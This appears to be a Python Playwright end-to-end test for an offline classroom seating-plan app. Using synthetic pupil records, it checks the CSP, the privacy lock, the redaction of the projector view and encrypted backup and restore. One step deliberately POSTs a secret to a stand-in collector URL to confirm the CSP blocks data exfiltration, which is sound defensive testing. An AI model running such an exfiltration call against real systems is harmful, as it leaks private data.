"""Privacy and restore end-to-end test. ALL pupil details below are synthetic.
Run: python tests/privacy_e2e.py  (requires Playwright and local Chromium).
Loads the REAL HTML and REAL CSP from localhost; no CSP bypass or external APIs.
"""
import asyncio
import csv
import io
import pathlib
import tempfile
import threading
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from playwright.async_api import async_playwright

ROOT=pathlib.Path(__file__).resolve().parents[1]
SENTINEL="SYNTHETIC_PRIVATE_NOT_FOR_NETWORK_44998"

class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self,*args): pass

def synthetic_csv():
    buf=io.StringIO()
    w=csv.writer(buf)
    w.writerow(['Learner','Class','Student ID','SEN Status','Pupil Premium Indicator','Y7 CS AT','Y7 CS COTTA'])
    w.writerow(['Pupil Alpha','8X/CS','ID1','K','Yes','7','5'])
    w.writerow(['Pupil Beta','8X/CS','ID2','N','No','5','5'])
    w.writerow(['Pupil Gamma','8X/CS','ID3','','','6','6'])
    return buf.getvalue().encode('utf-8')

async def main():
    handler=partial(QuietHandler,directory=str(ROOT))
    server=ThreadingHTTPServer(('127.0.0.1',0),handler)
    thread=threading.Thread(target=server.serve_forever,daemon=True);thread.start()
    url=f'http://127.0.0.1:{server.server_port}/'
    with tempfile.TemporaryDirectory() as temp:
        async with async_playwright() as pw:
            browser=await pw.chromium.launch(headless=True,executable_path='/usr/bin/chromium',args=['--no-sandbox'])
            context=await browser.new_context(accept_downloads=True)
            page=await context.new_page()
            requests=[];errors=[]
            page.on('request',lambda req:requests.append((req.method,req.url,req.post_data or '')))
            page.on('pageerror',lambda err:errors.append(str(err)))
            page.on('dialog',lambda d:asyncio.create_task(d.accept()))
            await page.goto(url,wait_until='networkidle')
            # Verify the exact, deployed CSP is active, rather than removing it as
            # the older unit smoke runner does for convenience.
            csp=await page.locator('meta[http-equiv="Content-Security-Policy"]').get_attribute('content')
            assert "connect-src 'none'" in csp
            assert "script-src 'self'" in csp
            assert await page.evaluate('!!crypto.subtle')
            # Fresh sessions clearly offer restoration or a new class wizard.
            assert await page.get_by_role('button',name='Restore encrypted backup').count()==1
            await page.get_by_role('button',name='Start class setup').click()
            assert await page.get_by_text('Set up your teaching groups').count()==1
            await page.locator('#csvFile').set_input_files({'name':'synthetic.csv','mimeType':'text/csv','buffer':synthetic_csv()})
            await page.get_by_role('button',name='Confirm reviewed import').click()
            # The next stage is the year-group OPP import, with the exact
            # staff folder instructions and ZIP/multiple-DOCX choices.
            assert await page.get_by_text('Next: import year-group OPPs').count()==1
            assert await page.get_by_text('One Page Profiles',exact=True).count()>=1
            assert await page.get_by_text('Inclusion Matters',exact=True).count()>=1
            assert await page.get_by_text('Year 8',exact=False).count()>=1
            assert await page.get_by_role('button',name='Choose PDF, Word or ZIP OPP files').count()==1
            assert await page.locator('#setup-opp-step').count()==1
            # The teacher may skip OPPs before choosing the next class.
            await page.get_by_role('button',name='Skip OPP import for now').click()
            assert await page.get_by_role('button',name='Import next class').count()==1
            assert await page.get_by_role('button',name="I'm finished · Create backup").count()==1
            # Repeat the wizard for a second fictional class, preserving the first.
            await page.get_by_role('button',name='Import next class').click()
            another=b'Learner,Class,Student ID,Target,COTTA Nov\nPupil Delta,9X/CS,ID4,7,6\n'
            await page.locator('#csvFile').set_input_files({'name':'second-synthetic.csv','mimeType':'text/csv','buffer':another})
            await page.get_by_role('button',name='Confirm reviewed import').click()
            assert await page.get_by_text('2 teaching groups',exact=False).count()>=1
            assert await page.get_by_text('Year 9',exact=False).count()>=1
            await page.get_by_role('button',name='Skip OPP import for now').click()
            await page.get_by_role('button',name="I'm finished · Create backup").click()
            assert await page.get_by_text('Create encrypted backup').count()>=1
            await page.locator('#modalRoot [data-action=close-modal]').click()
            await page.locator('#nav [data-view=dashboard]').click()
            await page.get_by_role('button',name='Open',exact=True).first.click()
            await page.get_by_role('button',name='+ New version').click()
            await page.locator('#modalForm button[type=submit]').click()
            assert await page.locator('.seat').count()==32
            await page.get_by_role('button',name='Plan notes').click()
            await page.locator('#modalForm textarea[name=notes]').fill(SENTINEL)
            await page.get_by_role('button',name='Save notes').click()
            await page.get_by_role('button',name='⚄ Generate seats').click()
            assert await page.get_by_text('Configure seating generation').count()==1
            await page.get_by_role('button',name='Preview seating plan').click()
            await page.get_by_role('button',name='Apply seating plan').click()
            assert await page.locator('.seat:not(.unassigned)').count()==3
            # Teacher seating has individually legible SEND/PP labels and no printed seat numbers.
            assert await page.locator('.seat .seat-tag.tag-send').count()>=1
            assert await page.locator('.seat .seat-tag.tag-pp').count()>=1
            assert await page.locator('.seat-number').count()==0
            # A normal tap opens private pupil support, not placement or a swap.
            occupied=page.locator('.seat:not(.unassigned)').first
            pupil_name=await occupied.locator('strong').inner_text()
            await occupied.click()
            summary=page.locator('.pupil-summary-modal')
            assert await summary.count()==1
            assert pupil_name in await summary.inner_text()
            assert await summary.get_by_role('button',name='Full OPP / profile').count()==1
            assert await summary.get_by_role('button',name='Move / swap').count()==1
            assert await page.locator('.seat:not(.unassigned)').count()==3
            # Moving requires a second deliberate seat selection.
            await summary.get_by_role('button',name='Move / swap').click()
            assert await page.get_by_text('Tap a destination seat',exact=False).count()>=1
            await page.locator('[data-action=cancel-seat-move]').click()
            assert await page.locator('.seat:not(.unassigned)').count()==3
            # Record a late arrival and verify that class/teacher reports separate
            # lateness from behaviour without treating blank SEND/PP as an error.
            await page.locator('#nav [data-view=records]').click()
            await page.get_by_role('button',name='+ Late arrival').click()
            await page.locator('#modalForm input[name=date]').fill('2026-11-23')
            await page.locator('#modalForm input[name=lesson]').fill('Period 2')
            await page.locator('#modalForm input[name=minutesLate]').fill('6')
            await page.locator('#modalForm button[type=submit]').click()
            assert await page.get_by_text('Lateness trends').count()==1
            assert await page.locator('table').get_by_text('Late to lesson').count()>=1
            await page.locator('#nav [data-view=overview]').click()
            assert await page.locator('th').get_by_text('Late',exact=True).count()==1
            assert await page.get_by_text('Missing SEND field').count()==0
            assert await page.get_by_text('Missing PP field').count()==0
            # Original-workbook parity: manual assessment history and teacher progress.
            await page.locator('#nav [data-view=assessments]').click()
            await page.get_by_role('button',name='+ Save assessment').click()
            await page.locator('#modalForm input[name=name]').fill('Synthetic unit assessment')
            await page.locator('#modalForm input[name=grade]').fill('6')
            await page.locator('#modalForm input[name=date]').fill('2026-11-23')
            await page.locator('#modalForm button[type=submit]').click()
            assert await page.locator('.progress-svg').count()==1
            # One-screen lesson timer, explicit question outcome and privacy lock.
            await page.locator('#nav [data-view=lesson]').click()
            await page.get_by_role('button',name='2 min').click()
            assert await page.locator('#lessonTimerLabel').inner_text()=='02:00'
            await page.get_by_role('button',name='Pick pupil').click()
            # Names spin visibly and the selected pupil is revealed after the roll.
            await page.locator('.picker-stage:not(.is-spinning) [data-picker-display]').wait_for(timeout=10000)
            await page.get_by_role('button',name='Questioned ✓').click()
            assert '1 pupil(s) questioned' in await page.locator('main').inner_text()
            await page.locator('#privacyToggle').click()
            assert 'Screen concealed' in await page.locator('main').inner_text()
            assert SENTINEL not in await page.locator('main').inner_text()
            await page.locator('#privacyToggle').click()
            await page.locator('#nav [data-view=seating]').click()
            # Projector receives names and positions only. It must not contain notes,
            # SEND/PP headings, source data or grades from the Edulink file.
            async with page.expect_popup() as open_info:
                await page.locator('.action-more summary').click()
                await page.get_by_role('button',name='Projector view').click()
            projector=await open_info.value
            await projector.wait_for_load_state('domcontentloaded')
            text=await projector.locator('body').inner_text()
            html=await projector.content()
            assert 'Pupil Alpha' in text
            for secret in [SENTINEL,'Pupil Premium','SEND','OPP','COTTA','T:7','C:5']:
                assert secret not in html,secret
            # A network request carrying sensitive information must be rejected by CSP.
            blocked=await page.evaluate('''async secret => {
                try {await fetch("https://example.org/collector",{method:"POST",body:secret});return false}
                catch {return true}
            }''',SENTINEL)
            assert blocked, 'CSP failed to block an external data transfer'
            # Verify, then restore a real encrypted download. Never upload it.
            await page.locator('#nav [data-view=backup]').click()
            await page.get_by_role('button',name='↓ Create encrypted backup').click()
            await page.locator('#modalForm [name=password]').fill('SyntheticPassword2026!')
            await page.locator('#modalForm [name=confirm]').fill('SyntheticPassword2026!')
            async with page.expect_download() as item:
                await page.locator('#modalForm button[type=submit]').click()
            saved=pathlib.Path(temp)/'synthetic.seatingplan'
            await (await item.value).save_as(saved)
            encrypted=saved.read_text(encoding='utf-8')
            assert SENTINEL not in encrypted
            await page.locator('#verifyBackupFile').set_input_files(str(saved))
            await page.locator('#modalForm [name=password]').fill('SyntheticPassword2026!')
            await page.get_by_role('button',name='Decrypt and verify').click()
            await page.locator('.notice[role=status]').get_by_text('Verified: the file decrypts correctly',exact=False).wait_for()
            assert 'Changes not backed up' not in (await page.locator('#saveIndicator').inner_text())
            # Restore into a clean session to prove the actual file is usable.
            await page.locator('#clearSession').click()
            await page.locator('#backupFile').set_input_files(str(saved))
            await page.locator('#modalForm [name=password]').fill('SyntheticPassword2026!')
            await page.get_by_role('button',name='Decrypt and restore').click()
            await page.locator('#nav [data-view=seating]').click()
            assert await page.locator('.seat:not(.unassigned)').count()==3
            await page.get_by_role('button',name='Plan notes').click()
            assert SENTINEL in await page.locator('#modalForm textarea[name=notes]').input_value()
            await page.get_by_role('button',name='Cancel').click()
            # Only static assets should have been requested from localhost.
            assert all(req[1].startswith(url) for req in requests),requests
            assert all(req[0]=='GET' for req in requests),requests
            assert all(SENTINEL not in str(req) and 'Pupil Alpha' not in str(req) for req in requests)
            assert not errors,errors
            print('PASS: strict CSP, private projector, local encrypted verify/restore and network leakage checks')
            await browser.close()
    server.shutdown();thread.join(timeout=2)

if __name__=='__main__':
    asyncio.run(main())
